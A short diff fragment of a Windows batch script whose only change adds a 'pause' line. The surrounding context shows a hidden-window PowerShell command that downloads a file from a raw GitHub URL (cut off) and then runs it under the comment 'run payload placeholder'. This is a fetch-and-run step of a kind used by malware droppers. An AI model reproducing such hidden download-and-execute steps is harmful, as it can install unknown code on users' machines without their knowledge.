@@ -20,6 +20,7 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.github
 
 @REM run payload placeholder
 powershell ./wget.cmd
+pause
 
 
 @REM cd %initialPath%
